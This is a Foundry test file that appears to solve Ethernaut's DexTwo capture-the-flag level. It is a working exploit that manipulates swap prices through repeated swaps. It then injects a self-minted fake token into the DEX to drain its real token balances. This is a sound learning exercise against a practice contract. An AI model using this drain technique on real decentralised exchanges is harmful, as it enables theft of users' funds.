pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ethernaut/core/Ethernaut.sol";
import "../src/ethernaut/23-DexTwo/DexTwo.sol";
import "../src/ethernaut/23-DexTwo/DexTwoFactory.sol";

contract DexTwoTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        DexTwoFactory factory = new DexTwoFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);
        DexTwo dex = DexTwo(levelAddress);
        SwappableTokenTwo token1 = SwappableTokenTwo(dex.token1());
        SwappableTokenTwo token2 = SwappableTokenTwo(dex.token2());
        dex.approve(address(dex), 1000);
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this))
        );
        dex.swap(
            address(token2),
            address(token1),
            dex.balanceOf(address(token2), address(this))
        );
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this))
        );
        dex.swap(
            address(token2),
            address(token1),
            dex.balanceOf(address(token2), address(this))
        );
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this))
        );
        dex.swap(address(token2), address(token1), 45);

        SwappableTokenTwo token3 = new SwappableTokenTwo(
            address(dex),
            "Token 3",
            "TKN3",
            180
        );
        
        token3.transfer(address(dex), 90);
        console.log("balance of token3 for player", token3.balanceOf(address(this)));
        console.log("balance of token2 for dex", token2.balanceOf(address(dex)));
        console.log("price",dex.getSwapAmount(address(token3), address(token2), 90));
        token3.approve(address(dex), 90);

        dex.swap(address(token3), address(token2), 90);


        console.log(
            "balance of token1 for dex",
            token1.balanceOf(address(dex))
        );
        console.log(
            "balance of token2 for dex",
            token2.balanceOf(address(dex))
        );
        console.log(
            "balance of token1 for player",
            token1.balanceOf(address(this))
        );
        console.log(
            "balance of token2 for player",
            token2.balanceOf(address(this))
        );

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
